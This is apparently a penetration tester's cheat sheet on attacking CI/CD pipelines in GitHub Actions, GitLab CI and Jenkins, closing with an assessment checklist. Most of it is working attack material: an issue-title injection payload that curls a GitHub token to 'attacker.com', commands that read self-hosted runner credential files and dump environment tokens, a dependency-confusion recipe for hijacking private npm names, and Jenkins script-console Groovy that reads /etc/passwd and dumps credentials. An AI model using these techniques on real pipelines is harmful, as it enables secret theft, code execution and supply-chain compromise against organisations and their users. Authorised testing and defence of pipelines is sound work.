# CI/CD Pipeline Attack Techniques

Covers GitHub Actions, GitLab CI, Jenkins, and supply chain via pipeline.

---

## Recon

```bash
# GitHub: find workflow files
find . -path '.github/workflows/*.yml' -exec grep -l "pull_request_target\|workflow_dispatch\|issue_comment" {} \;

# GitLab: check .gitlab-ci.yml for privileged runners
grep -E "privileged|docker-in-docker|dind|services:" .gitlab-ci.yml

# Jenkins: discover Jenkinsfiles, check /script endpoint
curl -sk "$JENKINS_URL/script" -w "%{http_code}"
```

---

## Attack Vectors

### 1. GitHub Actions — pull_request_target Poisoning
**Trigger:** Workflow uses `pull_request_target` + checks out PR code
**Attack:** PR from fork injects malicious code into trusted context
```yaml
# Vulnerable pattern:
on: pull_request_target
steps:
  - uses: actions/checkout@v3
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # ATTACKER CODE
  - run: make build  # Runs attacker's Makefile
```
**Impact:** Secret exfiltration, repo write access

### 2. GitHub Actions — Expression Injection
**Trigger:** Workflow interpolates user-controlled values unsanitized
```yaml
# Vulnerable:
- run: echo "Issue: ${{ github.event.issue.title }}"
# Payload in issue title: "; curl attacker.com/$(cat $GITHUB_TOKEN)"
```
**Impact:** Secret exfil, arbitrary command execution

### 3. Artifact Poisoning
**Trigger:** Workflow downloads artifacts from another workflow without verification
```bash
# Upload malicious artifact in PR workflow
# Trusted workflow downloads and executes it
gh api repos/org/repo/actions/artifacts --jq '.artifacts[].name'
```
**Impact:** Code execution in trusted workflow context

### 4. Self-Hosted Runner Escape
**Trigger:** Self-hosted runners without ephemeral configuration
```bash
# After code execution on runner:
# Check for persistent credentials
find / -name ".credentials" -o -name ".runner" 2>/dev/null
cat /home/runner/.credentials_rsaparams
# Check for docker socket
ls -la /var/run/docker.sock
# Other workflows' secrets may be cached
env | grep -i token
cat $RUNNER_TEMP/.setup_*
```
**Impact:** Lateral movement to other repos, persistent access

### 5. GitLab CI — Shared Runner Secrets
**Trigger:** Protected variables accessible from unprotected branches
```yaml
# Check if CI variables leak to MR pipelines
# In .gitlab-ci.yml of MR:
test:
  script:
    - env | sort  # Shows all available CI variables
    - echo $DEPLOY_KEY | base64
```

### 6. Dependency Confusion in CI
**Trigger:** Private packages without namespace protection
```bash
# Find private package names from lock files
grep -oE '"@[^/]+/[^"]+"' package-lock.json | sort -u
# Check if namespace is claimed on public registry
npm view @company/internal-lib 2>&1
# If "Not found" → register it on npmjs → pipeline installs yours
```
**Impact:** Code execution during build (every dev machine + CI)

### 7. Jenkins Script Console / Groovy
**Trigger:** Jenkins accessible, /script endpoint not locked
```groovy
// Remote code execution via script console
def cmd = "cat /etc/passwd".execute()
println cmd.text

// Dump all credentials
import jenkins.model.*
Jenkins.instance.getAllItems(org.jenkinsci.plugins.workflow.job.WorkflowJob).each {
  it.getEnvironment(null).each { k, v -> println "$k=$v" }
}
```

---

## Checklist (add to ctest Phase 3)

- [ ] Workflow files reviewed for injection points
- [ ] pull_request_target + checkout pattern checked
- [ ] Expression injection in run: steps checked
- [ ] Artifact trust boundaries verified
- [ ] Self-hosted runner isolation assessed
- [ ] CI secrets scope (protected vs unprotected branches)
- [ ] Dependency confusion on private packages
- [ ] Jenkins /script, /scriptApproval accessibility
